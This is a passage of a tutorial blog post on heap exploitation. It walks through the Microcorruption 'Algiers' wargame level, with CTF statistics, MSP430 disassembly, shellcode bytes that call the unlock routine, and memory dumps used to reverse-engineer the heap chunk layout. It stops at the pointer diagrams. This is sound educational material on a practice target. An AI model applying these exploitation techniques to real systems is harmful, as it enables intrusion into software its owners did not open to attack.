<!DOCTYPE html>
<html><head>
    <title>Algiers — James Every</title>

    <link rel="shortcut icon" type="image/jpg" href="./images/favicon/glider.ico"/>

    <meta charset="utf-8">
    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description"
        content="A minimal, almost class-less CSS library to write modern websites that look like LaTeX documents." />
    <!-- <meta name="keywords" content="latex.css,css library,class-less css,latex css" /> -->
    <meta property="og:title" content="James Every" />
    <meta property="og:url" content="https://latex.now.sh" />
    <meta property="og:description"
        content="The writings and projects of the invividual known as James Every." />
    <meta property="og:type" content="website" />


    <link rel="stylesheet" href="./css/style.min.css" />
    <link rel="stylesheet" href="./css/slider.css" />
    <style type="text/css">

.language-ascii-art {
 display: inline-block; 
 font-family: "Lucida Console", Monaco, monospace;
 letter-spacing: -0.2em;
 line-height: 0.8em;
 text-shadow: 0 0 5px rgba(100,100,100,0.5);
}

.language-ascii-noshadows {
 display: inline-block; 
 letter-spacing: 0em;
 line-height: 1.16em;
 white-space: pre-wrap;
}
    </style>    
</head>

<body>
<div>

<body id="top">
  <header>
    <h1>
A Stranger in Algiers:<br>The Psychology Behind Heap Exploitation Autodidacticism
    </h1>
    <p class="author">
      James Every <br />
      Cinco de Mayo, 2024
    </p>
  </header>

    <div class="abstract">
      <h2>Abstract</h2>

     <p>
     This page is an introduction to heap exploitation, specifically, the original dlmalloc-style unsafe unlink technique described in <a href="http://phrack.org/issues/57/9.html">Phrack 57:9</a>. The heap implementation is from <a href="https://microcorruption.com/debugger/Algiers">Algiers</a>, the 13th challenge from the <a href="https://microcorruption.com/map">Microcorruption</a> wargame originally developed by Matasano.
      </p>
    </div>

    <h2>
	    Overview
    </h2>
    <b>First Working Exploit:</b> 0621 UTC, April 2nd, 2020
    <br>
    <b>Reading Time:</b> 45 minutes


    <h5>Rendering Note:</h5>
<p>There is a known issue with Android lacking a true monotype system font, which breaks many of the extended ASCII character set diagrams below. Please view this page on a Chrome or Firefox-based desktop browser to avoid rendering issues.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
        Ideally on a Linux host.
</span></p>

    <h2>Executive Summary</h2>
    <p>If you want to write a

    <a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/smb/ms17_010_eternalblue.rb">zero-day exploit</a> that can

    <a href="https://www.bleepingcomputer.com/news/security/one-year-after-wannacry-eternalblue-exploit-is-bigger-than-ever/">destroy more money</a> than the GDP of <a href="https://countryeconomy.com/gdp?year=2018">47 countries</a> and then

    <a href="https://www.zerodium.com/images/zerodium_prices.png">sell it for a million dollars</a>, you will want to learn heap exploitation first. Given an embedded gray box heap implementation, this is how to go from a firmware dump to remote code execution without knowledge of the internals.</p>



    <h2>Motivation</h2>

<blockquote>
	[T]he subjects of software security (<em>with regard to binary exploitation</em>) are difficult to learn without an intimate understanding of that ‘underlying complexity’. The bar for entry demands an inordinate level of familiarity with obtuse low level software concepts, operating systems, CPU architecture, debuggers, disassemblers, and more. This depth of computer literacy can be intimidating to even senior software engineers. But when bundled and applied properly, exploit developers use this suite of knowledge to ‘surf on the fringe of what is possible’, opening doors to software and systems that were never intended to exist. As modern software security continues to evolve, this learning curve only grows more daunting.
	<br>
<cite>— <a href="https://blog.ret2.io/2018/09/11/scalable-security-education/#learning-curve">RET2 Systems</a></cite>
</blockquote>

    <p>Heap exploitation is baffling. Anyone with experience will recognize the accuracy of the following graph.</p>

    <br>
      <figure>
        <img src="./images/algiers/ret2systems-wargame-learning-curve.png"
          loading="eager" alt="Solves for p0ison3d challenge from DUCTF 2022." />
      </figure>

      <p>This phenomenon is easily verifiable in practice. Consider the following statistics.</p>

    <h5>DownUnder</h5>
    <p><a href="https://downunderctf.com/faqs/">DownUnder</a> is a CTF run by a conglomerate of thirteen Australian universities. It is a quintessential representative of low to mid-weight CTFs. It attracted <a href="https://downunderctf.com/blog/2022/ctf-statistics/#number-of-players">1,970 teams</a> from over <a href="https://downunderctf.com/blog/2022/ctf-statistics/#country-distribution">10 countries</a> in 2022. Of these, <a href="https://ctftime.org/event/1625">1,407 teams</a> scored any points at all, and 1,182 managed to score even marginally higher than the bare minimum required to show up on the official scoreboard.</p>

    <p>The most-solved heap exploitation challenge amassed <a href="https://downunderctf.com/blog/2022/ctf-statistics/#p0ison3d">71 solves</a>.</p>

    <br>
      <figure>
        <img src="./images/algiers/ductf-p0ison3d-solves.png"
          loading="eager" alt="Solves for p0ison3d challenge from DUCTF 2022." />
      </figure>

      <p>Measured relative to the 1,182 significant teams, this suggests that 6% of them had heap exploitation skills of any kind. Compare this with one of the <a href="https://downunderctf.com/blog/2022/ctf-statistics/#family-tree">least-solved</a> binary exploitation challenges in the event.</p>


    <br>
      <figure>
        <img src="./images/algiers/ductf-family-tree-solves.png"
          loading="eager" alt="Solves for family tree challenge from DUCTF 2022." />
      </figure>

    <p>Measured relative to the 1,182 significant teams, only 0.25% of them could exploit a custom allocator double-free vulnerability.</p>


    <h5>Microcorruption</h5>

    <p><a href="https://microcorruption.com/map">Microcorruption</a> is one of the longer-running wargames in existence. It has been continuously online for a decade. For the period spanning early 2014 to <a href="https://web.archive.org/web/20220513195347/https://microcorruption.com/hall_of_fame/progress">May 2022</a>, the level solve counts were as follows.</p>
    <br>
      <figure>
        <img src="./images/algiers/microcorruption-overall-progress.png"
          loading="eager" alt="Overall level progress for Microcorruption, circa May 13th, 2022." />
      </figure>

      <br>
      <table>
        <caption>Detailed user data.</caption>
        <thead>
          <tr>
            <th>User Category</th>
            <th>User Count</th>
          </tr>
        </thead> 
        <tbody>
          <tr>
                  <td><code>Registered</code></td>
                  <td><code>86,487</code></td>
          </tr>
          <tr>
                  <td><code>Completed Tutorial</code></td>
                  <td><code>51,203</code></td>
          </tr>
          <tr>
                  <td><code>Significant Users</code></td>
                  <td><code>29,872</code></td>
          </tr>
        </tbody>
      </table>

<p>The "significant users" are those who managed to solve the first real challenge, which required extracting a hardcoded password from the firmware image by analyzing the defined strings. The following percentiles derive from that baseline.</p>

      <br>
      <table>
        <caption>Heap exploitation level solve counts.</caption>
        <thead>
          <tr>
            <th>Level</th>
            <th>Number</th>
            <th>Solves</th>
            <th>Percentile</th>
          </tr>
        </thead> 
        <tbody>
          <tr>
                  <td><code>Algiers</code></td>
                  <td><code>[#14]</code></td>
                  <td><code>2564</code></td>
		  <td><code>91<sup>st</sup></code></td>
          </tr>
          <tr>
                  <td><code>Chernobyl</code></td>
                  <td><code>[#18]</code></td>
                  <td><code>788</code></td>
		  <td><code>97<sup>th</sup></code></td>
          </tr>
        </tbody>
      </table>

      <p>These challenges involve a variant of the original dlmalloc unlink exploits. Despite the underlying technique being <em>20 years old</em>, only 1 in 12 significant users can implement it. Introducing additional constraints drops the number to 1 in 38.</p>

      <p>

These numbers span more than eight years, with step-by-step walkthroughs and video tutorials for these exact challenges available for most of that duration. The sheer duration skews the data; accounting for "writeup bias" requires data from before walkthroughs were publicly available. The earliest data available is from <a href="https://web.archive.org/web/20160414044337/https://microcorruption.com/hall_of_fame/progress">2016</a>—two years into the total lifespan.</p>

    <br>
      <figure>
        <img src="./images/algiers/microcorruption-overall-progress-historical.png"
          loading="eager" alt="Overall level progress for Microcorruption, circa April 2016." />
      </figure>

      <p>At this point, 1 in 7 significant users had solved level 14, and 1 in 25 had solved level 18. Based on these more conservative numbers, eighty-six percent of the population who can extract hard-coded credentials from firmware images cannot write heap exploits—even using old techniques with tailor-made writeups available.</p>

      <h3>Pedagogy</h3>

      <h5>Why is this hard?</h5>
      <p>There are decent resources for learning more advanced techniques against newer implementations. Shellphish's How2Heap repository is a good reference, and Max Kamper's HeapLAB course is generally well-regarded.</p>


      <p>There are very few good resources for learning introductory heap exploitation. Microcorruption is one of them. LiveOverflow's Binary Exploitation series is a helpful resource—specifically videos 0x13 and 0x14—and there is Phrack. Based on the above statistics, each of these resources lacks something.</p>

      <ol>
	      <li>Learning heap exploitation from Phrack is like attempting to learn phonetic language from cuniform tablets.</li>
	      <li>Watching LiveOverflow's binary exploitation series without the correct background is like watching a hyperactive mayfly on amphetamines.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
 That said, it is probably the most intelligible video resource available on the subject, and it does an excellent job of attempting to interpret Phrack 57:9 for a modern audience.
</span></li>
	      <li>Microcorruption is excellent, especially for avoiding tooling hassles, but it throws the learner into the deep end to learn from first principles.</li>
      </ol>

      <h5>The Problem with Hacking Autodidactism</h5>

<blockquote>
Like crossword puzzles, many security wargames have been designed to challenge users—not to teach them. Their use as an educational resource has grown simply due to the lack of better alternatives.
	<br>
<cite>— <a href="https://blog.ret2.io/2018/09/11/scalable-security-education/#exploit-education">RET2 Systems</a></cite>
</blockquote>

<p>While it might be popular to say we are standing on the shoulders of giants, the truth is that most of the pioneers in this field are notoriously bad at paving the way for future generations. The reason is simple: explaining the underlying thought process behind reverse engineering is <em>time-consuming</em>.</p>

<h5>Reverse Engineering Embedded Heap Algorithms</h5>

<p>What is the thought process required to develop a technique in the first place? How would someone discover the original dlmalloc unlink write primitive? Those are the questions this walkthrough will answer.</p>

<p></p>

    <h2>Overview</h2>
    <p>The target heap implementation is from the Microcorruption CTF-turned-wargame. It was developed a decade ago by Matasano and centered around a deliberately vulnerable smart lock. The goal for each challenge is simple: write a software exploit to trigger an unlock.</p>

	    <p>Algiers is the 14th level in the series and the first of two that involve heap exploitation. The implementation used on Algiers is essentially a stripped-down version of early dlmalloc. Minor details aside, it works well for the sake of demonstration.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	The main difference is that this implementation does not store metadata inline (requiring a buffer overflow rather than a use-after-free exploit). Chunks are always part of a linked list regardless of allocation status. This implementation also omits the <code>prev_size</code> field. None of these differences conceptually affect the exploit technique. 
</span></p>


    <h3>System Architecture</h3>

    <p>The emulated device runs on the MSP430 instruction set architecture. It uses a 16-bit little-endian processor and has 64 kilobytes of RAM. The <a href="https://microcorruption.com/public/manual.pdf">official manual</a> includes the details, but relevant functionality is summarized below.</p>

    <h3>Interface</h3>
    <p>Several separate windows control the debugger functionality.</p>

    <br>
      <figure>
        <img src="./images/algiers/algiers-gui.png"
          loading="eager" alt="Debugger GUI." />
      </figure>

      <p>The following user input prompt is the device's external communication interface.</p>
      <br>
      <figure>
        <img src="./images/algiers/algiers-input-prompt.png"
          loading="eager" alt="Popup triggered by getsn interrupt." />
      </figure>

      <h3>Exploit Development Objective</h3>
      <p>The equivalent of popping a shell on this system is calling the <code>unlock_door</code> function.</p>

      <br>
      <figure>
        <img src="./images/algiers/algiers-unlock-door-function.png"
          loading="eager" alt="The unlock door function." />
      </figure>

      <p>Executing the following assembly is functionally equivalent to calling the <code>unlock_door</code> function.</p>

      <h5>Disassembly</h5>
      <pre><code>3240 00ff      mov     #0xff00, sr
b012 1000      call    #0x10
</code></pre>

<h5>Assembly</h5>
<pre><code>324000ffb0121000</code></pre>

      <p>This results in the following message displaying in the interface.</p>

      <br>
      <figure>
        <img src="./images/algiers/algiers-unlock.png"
          loading="eager" alt="Unlock status message." />
      </figure>



<h2>High-Level Analysis</h2>
<h3>Sample Output</h3>
<p>Typing "continue" at the debug console will produce the following output at the I/O console.</p>

<pre><code>Enter your username and password to continue.
Username &gt;&gt;
</code></pre>

<p>Supplying a test username (e.g., "admin") then causes the code to prompt for a password.</p>

<pre><code>Username &gt;&gt;
(Remember: passwords are between 8 and 16 characters.)</code></pre>

<p>The following output is the result after sending a test password (e.g., "password").</p>

<pre><code>That password is not correct.</code></pre>

<h3>Flow Control Graph</h3>
<p>The <code>login</code> function handles the top-level logic in Algiers. The Ghidra flow control graph for this function is as follows.</p>

<br>
      <figure>
        <img src="./images/algiers-login-flow-control.png"
          loading="eager" alt="Algiers login function flow control graph." />
      </figure>

<h3>Static Analysis</h3>
<p>By design, the <code>login</code> function calls <code>unlock_door</code> only if <code>test_password_valid</code> returns a specific value in <code>R15</code>.</p>

    <hr>
      <figure>
        <img src="./images/algiers/algiers-test-password-valid-success.png"
          loading="eager" alt="Call to unlock_door." />
      </figure>
    <hr>

    <p>The disassembly for the <code>test_password_valid</code> function is as follows.</p>
    <pre><code>4570 &lt;test_password_valid&gt;
4570:  0412           push	r4
4572:  0441           mov	sp, r4
4574:  2453           incd	r4
4576:  2183           decd	sp
4578:  c443 fcff      mov.b	#0x0, -0x4(r4)
457c:  3e40 fcff      mov	#0xfffc, r14
4580:  0e54           add	r4, r14
4582:  0e12           push	r14
4584:  0f12           push	r15
4586:  3012 7d00      push	<mark>#0x7d</mark>
458a:  b012 b646      call	#0x46b6 &lt;INT&gt;
458e:  5f44 fcff      mov.b	-0x4(r4), r15
4592:  8f11           sxt	r15
4594:  3152           add	#0x8, sp
4596:  3441           pop	r4
4598:  3041           ret</code></pre>

    <p>The <code>0x7D</code> interrupt call sets the contents of <code>R15</code>. Anyone working through the wargame from the beginning would already be familiar with this functionality because it exists in previous levels.</p>

<h5>HSM Model 1</h5>
<blockquote>
	3.2 HSM Model 1<br>
	The Model 1 of the hardware security module contains a simple interface which allows the MCU to test if an entered password is valid. By default, the interrupt <mark>0x7D</mark> will pass a given password to the HSM, and will <em>set a byte in memory</em> if the password entered matches the stored password.
<br>
<cite>— <a href="https://microcorruption.com/public/manual.pdf">Microcorruption Manual</a></cite>
</blockquote>

<h3>Hardware Architecture</h3>


<p>The password is stored in the HSM to prevent an attacker from extracting it from memory. Communications between the MCU and HSM occur over something like a serial line. The HSM receives password attempts and returns a boolean indicating whether the password is correct. The hardware architecture resembles the following diagram.</p>

<br>
      <figure>
        <img src="./images/hanoi-hardware.png"
          loading="eager" alt="Vancouver hardware architecture." />
      </figure>

      <p>An online brute-force attack against an eight-to-sixteen-character password is infeasible, necessitating exploiting the HSM or achieving arbitrary code execution on the main MCU. The latter approach is the intended solution.</p>


<h3>Dynamic Analysis</h3>
<p>The first objective is to determine the location of user input in memory.</p>


      <br>
      <figure>
        <img src="./images/algiers/algiers-input-prompt-with-dummy-data.png"
          loading="eager" alt="Junk data is supplied at the input prompt." />
      </figure>

<p>Supplying 64 bytes of the non-printing character 0xAA provides a recognizable pattern that is discernable from a memory dump.</p>

      <br>
      <figure>
        <img src="./images/algiers/algiers-dummy-data-in-memory.png"
          loading="eager" alt="Junk data in memory." />
      </figure>

      <p>The implementation only reads 48 bytes into memory at the above location. The next step is to determine what data was originally there.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>


<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
      Reset the debugger using the "reset" command, then type "continue." When the input prompt pops up, click the "wait" button.
</span>
The following slideshow depicts this memory region before the read, after sending the username, and after sending the password.</p>

      <br>
<div id="slides">
  <section id="memory-before-read">
        <img src="./images/algiers/algiers-memory-before-read.png"
          loading="eager" alt="Memory before read." />
  </section>
  <section id="memory-after-username-read">
        <img src="./images/algiers/algiers-dummy-data-in-memory.png"
          loading="eager" alt="Junk username data in memory." />
  </section>
  <section id="memory-after-password-read">
        <img src="./images/algiers/algiers-memory-after-second-read.png"
          loading="eager" alt="Junk password data in memory." />
  </section>
</div>
<ul id="nav">
  <li><a href="#memory-before-read">Before</a></li>
  <li><a href="#memory-after-username-read">Username</a></li>
  <li><a href="#memory-after-password-read">Password</a></li>
</ul>

<p>It is important to note that this memory region is not the stack. The stack resides at a significantly higher address range.</p>

      <br>
      <figure>
        <img src="./images/algiers/algiers-stack-location.png"
          loading="eager" alt="Algiers stack location."/>
      </figure>


      <p>A few parts of this memory are non-zero before the reads, which are overwritten with the test data afterward.</p>

<pre><code>0170: *  
2400: 0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
2410: 0000 0000 0000 0000 0000 0000 0000 <mark>0824</mark>   ...............$
2420: <mark>3424 2100</mark> 0000 0000 0000 0000 0000 0000   4$!.............
2430: 0000 0000 <mark>1e24 0824 9c1f</mark> 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
2450: *  </code></pre>

<p>The challenge is thus as follows: redirect execution flow to the <code>unlock_door</code> function given control of these six words.</p>

<h3>Attack Surface</h3>
<p>By definition, only code executed after reading user input can be vulnerable—which rules out half the code in the <code>login</code> function. The remaining blocks are of interest.</p>

<br>
<hr>
      <figure>
        <img src="./images/algiers/algiers-state-space.png"
          loading="eager" alt="State space." />
      </figure>

      <p>Anyone who has worked through the previous challenges in the series understands the behavior of <code>puts</code> and <code>getsn</code>. The <code>free</code> function, by process of elimination, must be the vulnerable one—a theory supported by examining the pointer passed to <code>free</code> in <code>R15</code>.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-break-at-free.png"
          loading="eager" alt="Breakpoints set before calls to free function." />
      </figure>

      <p>Supply shorter test data on this iteration. Depending on the call, <code>R15</code> points to the start of the username or password buffer, near the six words noted earlier.</p>

<br>
<div id="slides">
  <section id="r15-free-1">
        <img src="./images/algiers/algiers-memory-free-1.png"
          loading="eager" alt="Memory before read." />
  </section>
  <section id="r15-free-2">
        <img src="./images/algiers/algiers-memory-free-2.png"
          loading="eager" alt="Junk username data in memory." />
  </section>
</div>
<ul id="nav">
  <li><a href="#r15-free-1">Free 1</a></li>
  <li><a href="#r15-free-2">Free 2</a></li>
</ul>

<h2>Memory Access Patterns</h2>

<p>Single-stepping through the first <code>free</code> call while watching the <code>0x2400</code> region reveals the memory access patterns. It is convoluted to follow but indicates which words the algorithm utilizes.</p>

<div id="slides">
  <section id="free-1-step-1">
        <img src="./images/algiers/algiers-free-1-step-1.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-2">
        <img src="./images/algiers/algiers-free-1-step-2.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-3">
        <img src="./images/algiers/algiers-free-1-step-3.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-4">
        <img src="./images/algiers/algiers-free-1-step-4.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-5">
        <img src="./images/algiers/algiers-free-1-step-5.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-6">
        <img src="./images/algiers/algiers-free-1-step-6.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-7">
        <img src="./images/algiers/algiers-free-1-step-7.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-8">
        <img src="./images/algiers/algiers-free-1-step-8.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-9">
        <img src="./images/algiers/algiers-free-1-step-9.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-10">
        <img src="./images/algiers/algiers-free-1-step-10.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-11">
        <img src="./images/algiers/algiers-free-1-step-11.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-1-step-12">
        <img src="./images/algiers/algiers-free-1-step-12.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
</div>
<ul id="nav">
  <li><a href="#free-1-step-1">01</a></li>
  <li><a href="#free-1-step-2">02</a></li>
  <li><a href="#free-1-step-3">03</a></li>
  <li><a href="#free-1-step-4">04</a></li>
  <li><a href="#free-1-step-5">05</a></li>
  <li><a href="#free-1-step-6">06</a></li>
  <li><a href="#free-1-step-7">07</a></li>
  <li><a href="#free-1-step-8">08</a></li>
  <li><a href="#free-1-step-9">09</a></li>
  <li><a href="#free-1-step-10">10</a></li>
  <li><a href="#free-1-step-11">11</a></li>
  <li><a href="#free-1-step-12">12</a></li>
</ul>

<p>There are only a few writes. The second call to <code>free</code> is slightly more involved.</p>

<br>

<div id="slides">
  <section id="free-2-step-1">
        <img src="./images/algiers/algiers-free-2-step-1.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-2">
        <img src="./images/algiers/algiers-free-2-step-2.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-3">
        <img src="./images/algiers/algiers-free-2-step-3.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-4">
        <img src="./images/algiers/algiers-free-2-step-4.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-5">
        <img src="./images/algiers/algiers-free-2-step-5.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-6">
        <img src="./images/algiers/algiers-free-2-step-6.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-7">
        <img src="./images/algiers/algiers-free-2-step-7.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-8">
        <img src="./images/algiers/algiers-free-2-step-8.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-9">
        <img src="./images/algiers/algiers-free-2-step-9.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-10">
        <img src="./images/algiers/algiers-free-2-step-10.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-11">
        <img src="./images/algiers/algiers-free-2-step-11.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-12">
        <img src="./images/algiers/algiers-free-2-step-12.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-13">
        <img src="./images/algiers/algiers-free-2-step-13.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-14">
        <img src="./images/algiers/algiers-free-2-step-14.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
  <section id="free-2-step-15">
        <img src="./images/algiers/algiers-free-2-step-15.png"
          loading="eager" alt="Algiers memory during free call." />
  </section>
</div>
<ul id="nav">
  <li><a href="#free-2-step-1">01</a></li>
  <li><a href="#free-2-step-2">02</a></li>
  <li><a href="#free-2-step-3">03</a></li>
  <li><a href="#free-2-step-4">04</a></li>
  <li><a href="#free-2-step-5">05</a></li>
  <li><a href="#free-2-step-6">06</a></li>
  <li><a href="#free-2-step-7">07</a></li>
  <li><a href="#free-2-step-8">08</a></li>
  <li><a href="#free-2-step-9">09</a></li>
  <li><a href="#free-2-step-10">10</a></li>
  <li><a href="#free-2-step-11">11</a></li>
  <li><a href="#free-2-step-12">12</a></li>
  <li><a href="#free-2-step-13">13</a></li>
  <li><a href="#free-2-step-14">14</a></li>
  <li><a href="#free-2-step-15">15</a></li>
</ul>

<p>As suspected, the algorithm seems to change the six words observed previously.</p>

<h3>Data Structure</h3>
<p>Several implementation details are inferrable from the contents of the memory region.</p>

<br>
<div id="slides">
  <section id="data-structure-1" style="height: 28em">
<pre><code>0824 0010 0000 0000 0824 1e24 2100 <mark>aaaa</mark>
0000 0000 0000 0000 0000 0000 0000 0824
3424 2100 <mark>bbbb</mark> 0000 0000 0000 0000 0000
0000 0000 1e24 0824 9c1f 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
</code></pre>

<p>The exact data structure may be opaque, but the two <code>free</code> calls indicate the presence of at least two discrete sections of the memory: one for the username and one for the password.</p>
  </section>
  <section id="data-structure-2" style="height: 28em">

<pre><code>0824 0010 0000 0000 0824 1e24 2100 <mark>aaaa</mark>
0000 0000 0000 0000 0000 0000 0000 0824
3424 2100

          <mark>bbbb</mark> 0000 0000 0000 0000 0000
0000 0000 1e24 0824 9c1f 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
</code></pre>

<p>First, divide the memory in half at the address where the password buffer begins.</p>
  </section>
  <section id="data-structure-3" style="height: 28em">
<pre><code>0824 0010 0000 0000 0824 1e24 2100 aaaa
0000 0000 0000 0000 0000 0000 0000 0824
3424 2100

          <mark>bbbb 0000 0000 0000 0000 0000</mark>
<mark>0000 0000</mark> 1e24 0824 9c1f 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
</code></pre>

<p>The status message indicates that passwords are between eight and sixteen characters, which means the buffer is probably sixteen bytes.</p>
  </section>
  <section id="data-structure-4" style="height: 28em">
<pre><code>0824 0010 0000 0000 0824 1e24 2100 aaaa
0000 0000 0000 0000 0000 0000 0000 0824
3424 2100

bbbb 0000 0000 0000 0000 0000 0000 0000 

<mark>1e24 0824 9c1f</mark> 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000
</code></pre>

<p>Everything after that buffer is something else.</p>

  </section>
  <section id="data-structure-5" style="height: 28em">
<pre><code>0824 0010 0000 0000 0824 1e24 2100

<mark>aaaa 0000 0000 0000 0000 0000 0000 0000</mark>

0824 3424 2100

bbbb 0000 0000 0000 0000 0000 0000 0000 

1e24 0824 9c1f 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000
</code></pre>

<p>The username buffer has a similar structure, so it is separated.</p>

  </section>
  <section id="data-structure-6" style="height: 28em">
<pre><code>0824 0010 0000 0000 0824 1e24 2100

aaaa 0000 0000 0000 0000 0000 0000 0000

0824 3424 2100

<mark>bbbb</mark> 0000 0000 0000 0000 0000 0000 0000 

1e24 0824 9c1f 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000
</code></pre>

<p>Recall that the value passed to the first iteration of <code>free</code> points at the start of the password buffer.</p> 
  </section>
  <section id="data-structure-7" style="height: 28em">

<pre><code>0824 0010 0000 0000 0824 1e24 2100

aaaa 0000 0000 0000 0000 0000 0000 0000

<mark>0824 3424 2100</mark>

bbbb 0000 0000 0000 0000 0000 0000 0000 

1e24 0824 9c1f 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000
</code></pre>

<p>As previously observed, only the preceding three words change during this first call.</p>
  </section>
  <section id="data-structure-8" style="height: 28em">

<pre><code>0824 0010 0000 0000 0824 1e24 2100

aaaa 0000 0000 0000 0000 0000 0000 0000

<mark>0824 3424 2100</mark>

<mark>bbbb 0000 0000 0000 0000 0000 0000 0000</mark> 

1e24 0824 9c1f 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000
</code></pre>

<p>This pattern suggests that these two segments are related.</p>
  </section>
  <section id="data-structure-9" style="height: 28em">
<pre><code>0824 0010 0000 0000 0824 1e24 2100

aaaa 0000 0000 0000 0000 0000 0000 0000

0824 3424 2100

bbbb 0000 0000 0000 0000 0000 0000 0000 

1e24 0824 9c1f 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000
</code></pre>

<p>There are two <code>malloc</code> calls before the two <code>free</code> calls. Even without knowing what <code>malloc</code> does, it is reasonable to assume these two functions are related based on the proportional number of calls. The <code>malloc</code> calls likely instantiate something, and the <code>free</code> calls modify it somehow. Presumably, the two data structures created by <code>malloc</code> should be functionally identical. 
  </section>
  <section id="data-structure-10" style="height: 28em">
<pre><code>0824 0010 0000 0000

<mark>0824 1e24 2100</mark>

<mark>aaaa 0000 0000 0000 0000 0000 0000 0000</mark>

0824 3424 2100

bbbb 0000 0000 0000 0000 0000 0000 0000 

1e24 0824 9c1f 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000
</code></pre>

<p>The order of these calls implies that, much like the password buffer, the username buffer is somehow related to its preceding three words.</p>

  </section>
  <section id="data-structure-11" style="height: 28em">

<pre><code>0824 0010 0000 0000

0824 1e24 2100

aaaa 0000 0000 0000 0000 0000 0000 0000

0824 3424 2100

bbbb 0000 0000 0000 0000 0000 0000 0000 

<mark>1e24 0824 9c1f</mark>

<mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>
</code></pre>

<p>Extrapolating from this pattern, the six words after the password buffer probably serve the same purpose for the next section of the data structure.</p>

  </section>
</div>
<ul id="nav">
  <li><a href="#data-structure-1">01</a></li>
  <li><a href="#data-structure-2">02</a></li>
  <li><a href="#data-structure-3">03</a></li>
  <li><a href="#data-structure-4">04</a></li>
  <li><a href="#data-structure-5">05</a></li>
  <li><a href="#data-structure-6">06</a></li>
  <li><a href="#data-structure-7">07</a></li>
  <li><a href="#data-structure-8">08</a></li>
  <li><a href="#data-structure-9">09</a></li>
  <li><a href="#data-structure-10">10</a></li>
  <li><a href="#data-structure-11">11</a></li>
</ul>


<h3>Reversing Endianness</h3>
<p>The MSP430 is a little-endian processor, which makes reading pointers in a memory dump difficult. Reverse the endianness for every word to make the web of pointers understandable.</p>

<br>
<div id="slides">
  <section id="data-structure-little-endian">
<pre><code>0824 0010 0000 0000

0824 1e24 2100

aaaa 0000 0000 0000 0000 0000 0000 0000

0824 3424 2100

bbbb 0000 0000 0000 0000 0000 0000 0000 

1e24 0824 9c1f

0000 0000 0000 0000 0000 0000 0000 0000
</code></pre>
  </section>
  <section id="data-structure-big-endian">
<pre><code>2408 1000 0000 0000

2408 241e 0021

aaaa 0000 0000 0000 0000 0000 0000 0000

2408 2434 0021

bbbb 0000 0000 0000 0000 0000 0000 0000 

241e 2408 1f9c

0000 0000 0000 0000 0000 0000 0000 0000
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#data-structure-little-endian">Little-endian</a></li>
  <li><a href="#data-structure-big-endian">Big-endian</a></li>
</ul>

<h3>Pointer Structure</h3>
<p>The sections of memory are as follows.</p>

<pre><code class='language-ascii-noshadows'>┌────────┬────────┬────────┬──────┐
│  2408  │  1000  │  0000  │ 0000 │
└────────┴────────┴────────┴──────┘

┌────────┬────────┬────────┬──────────────────────────┐
│  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
└────────┴────────┴────────┴──────────────────────────┘

┌────────┬────────┬────────┬──────────────────────────┐
│  2408  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │
└────────┴────────┴────────┴──────────────────────────┘

